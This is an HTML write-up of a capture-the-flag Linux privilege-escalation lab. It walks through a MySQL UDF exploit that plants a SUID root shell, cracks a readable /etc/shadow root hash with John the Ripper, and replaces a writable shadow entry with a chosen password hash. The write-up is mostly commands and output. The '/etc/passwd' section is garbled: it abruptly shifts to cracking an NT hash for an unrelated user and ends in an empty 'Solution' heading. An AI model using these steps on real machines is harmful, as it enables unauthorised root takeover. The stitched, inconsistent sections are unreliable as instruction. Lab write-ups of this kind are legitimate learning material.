                <h2>Service Exploits - MySQL</h2>
                <p>The first challenge informs us that there is an incorrectly configured MySQL service running as root. It also tells us there is no password! Let us start a command-line client session and connect to the MySQL server as the user root.</p>
                <pre><code>user@debian:~$ mysql -u root</code></pre>
                <p>Sure enough the connection was successful. No password required!</p>
                <pre><code>mysql> SELECT USER();
+--------------------+
| USER()             |
+--------------------+
| root@localhost     |
+--------------------+</code></pre>
                <p>Next, let us see what privileges are assigned to our currently logged-in MySQL user, in our case root. Understanding these permissions will help us identify our potential next steps and what avenues are open to us for further exploiting the machine.</p>
                <pre><code>mysql> SHOW GRANTS FOR CURRENT_USER;</code></pre>
                <p>Gives the output: </p>
                <pre><code>+---------------------------------------------------------------------+
| Grants for root@localhost                                           |
+---------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION |
+---------------------------------------------------------------------+</code></pre>
                <p>Excellent. Our user, root, has "ALL PRIVILEGES" set, meaning we have complete access to all databases and tables on the MySQL server. This challenge has practically handed us the exploit to use and even placed the necessary code on the target server. However, let's perform the steps manually for learning purposes. The exploit in question can be found <a href="https://www.exploit-db.com/exploits/1518">here</a> (EDB-ID: 1518).</p>
                <p>The exploit code <a href="https://www.exploit-db.com/exploits/1518">here</a> (EDB-ID: 1518) leverages a vulnerability in MySQL's User Defined Functions (UDFs) to achieve local privilege escalation. UDFs extend MySQL functionality by allowing users to create custom functions written in C, loaded as shared libraries. In this exploit, the code defines a UDF, <strong>do_system()</strong>, which executes shell commands using the C standard library function <strong>system()</strong>. We can invoke our UDF through MySQL and instruct it to spawn a shell. Since MySQL is running as the root user, any system command exectued through <strong>do_system()</strong> will also run with root privileges. This means we can achieve a root shell, gaining full control over the target system</p>
                <p>Navigate to the "/tmp" directory and create a file to hold the UDF exploit code.</p>
                <pre><code>user@debian:/tmp$ nano exploit_udf.c</code></pre>
                <p>Paste the exploit code into the file, ensure it is copied exactly, as any syntax errors will casue issues during compilation. Once you have saved the file, compile it using <strong>gcc</strong> to produce a shared object (.so) file:</p>
                <pre><code>user@debian:/tmp$ gcc -Wall -fPIC -shared -o exploit_udf.so exploit_udf.c -lc</code></pre>
                <p>Connect to the MySQL server and switch to the <strong>MySQL</strong> system database:</p>
                <pre><code>mysql> use mysql
Reading table information for completion of table and columns names
You can turn off this feature to get a quicker startup with -A
                
Database changed
mysql> </code></pre>
                <p>Create a new table "foo" with a single column, let's a call it "line", of type "BLOB":</p>
                <pre><code>mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)</code></pre>
                <p>Load the shared object file we created eariler in to the table, "foo":</p>
                <pre><code>mysql> insert into foo values(load_file('/tmp/exploit_udf.so'));
Query OK, 1 row affected (0.00 sec)</code></pre>
                <p>Dump the contents of the "foo" table into a file, effectively placing the UDF shared object file in a directory where MySQL expects to find plugin libraries:</p>
                <pre><code>mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/exploit.so';
Query OK, 1 row affected (0.00 sec)</code></pre>
                <p>Create a custom MySQL function called "do_system" that will be available for use in SQL queries. The "soname" directive tells MySQL to load the function from the shared library "exploit_udf.so":</p>
                <pre><code>mysql> create function do_system returns integer soname 'exploit_udf.so';
Query OK, 0 rows affected (0.00 sec)</code></pre>
                <p>Use the custom function to copy the "/bin/bash" binary to "/tmp/rootbash", and set the SUID bit so we can run it as root, the creator of the file, also make it executable:</p>
                <pre><code>mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+---------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash')    |
+---------------------------------------------------------------------+
|                                                                   0 |
+---------------------------------------------------------------------+
1 row in set (0.00 sec)</code></pre>
                <p>Exit the MySQL client and run the root shell ("-p" is important here as it tells BASH not to reset the environment variables to default, which would typically strip out any special environment variables or manipulations that may have been set during the eariler steps of our attack).</p>
                <pre><code>user@debian:/tmp$ /tmp/rootbash -p
rootbash-4.1# whoami
root</code></pre>
                <p><strong>Congratulations, you own the system!</strong></p>
            </section>
            <section id="Two">
                <h2>Readable /etc/shadow</h2>
                <p>The "/etc/shadow" file that contains user password hashes should only be readable by root. Let us see if that is the case:</p>
                <pre><code>user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25 2019 /etc/shadow</code></pre>
                <p>Nope! It is readable by absolutely everyone! Let us have a look inside:</p>
                <pre><code>user@debian:~$ nano /etc/shadow
root:$6$Tb/euwmL$*********************************************</code></pre>
                <p>We have the password hash for root (I have masked it here, so you can go and look for yourself). This is likely a <strong>SHA512crypt</strong> hash, as this is the hashing algorithm commonly used in Unix-like operating systems to store password hashes in the system's "/etc/shadow" file. Let's use John the Ripper (JTR) to see if we can crack it.</p>
                <pre><code>user@local:~/path/to/john$ ./john -format=sha512crypt -wordlist=/I/am/using/rockyou.txt /path/to/saved/hash</code></pre>
                <p>Sure enough this gives us the root password. Switch back to the target machine and switch to root, using the password.</p>
                <pre><code>user@debian:~$ su root
Password:
root@debian/home/user# whoami
root</code></pre>
                <p><strong>Congratulations, you own the system!</strong></p>
            <section id="Three">
                <h2>Writable /etc/shadow</h2>                
                <p>This technique is similar to the last. The "/etc/shadow" file should only be writable by root. In our case, we can see that it is writable by absolutely anyone, bad idea!</p>
                <pre><code>user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25 2019 /etc/shadow</code></pre>
                <p>In this instance we can simply replace the root user's hash with our own hash. First, create the hash:</p>
                <pre><code>user@debian:~$ mkpasswd -m sha-512 naughty123
$6$eR5nW1fZ63CE6Fy/$6g1I55XBX1ObH88mPxMI1CntZEq2mbT3BeJXkafhdjtKS.CZ2Krktglc0xOq60ByeK01ZzqMpj4Fz/H6PHlWH0</code></pre>
                <p>Replace the root user's hash with your own and switch to root:</p>
                <pre><code>user@debian:~$ su root
Password:
root@debian/home/user# whoami
root</code></pre>
                <p><strong>Congratulations, you own the system!</strong></p>
            </section>
            <section id="Four">
                <h2>Writeable /etc/passwd</h2>
                <p>Again, a very similar techinque to the last two. In this case, we discover that we can write to the file "/etc/passwd".</p>

                
                <p>Firstly save the hash for user Jon to a text file. Then pass the hash to JTR.</p>
                <pre><code>case@local:~/src/john/run$ ./john --format=NT --fork=8 --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt</code></pre>
                <p>We now have user "Jon's" password.</p>
                <pre><code>Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Node numbers 1-8 of 8 (fork)
Note: Passwords longer than 27 rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
alq.......... (?)</code></pre>
                <p>I have not actually shown the password, do it yourself!</p>

                <h2>Solution</h2>
                <p>First flag is here:</p>

            <section id="conclusion">
                <h2>Conclusion</h2>
                <p>This was my second CTF challenge and I found it a lot more challenging than than the first one I did. However, this was primarily because I did not follow any of the pre-existing write-ups, importantly, I did not utilise Metasploit, which would have made this challenge a darn sight easier. My reason for approaching the challenge in this way is that I want to learn as much as possible. By coming up with my own ideas and approaches and testing them out, I fail more frequently. This is good, as it forces me to read more and understand how things work on a deeper level.</p>
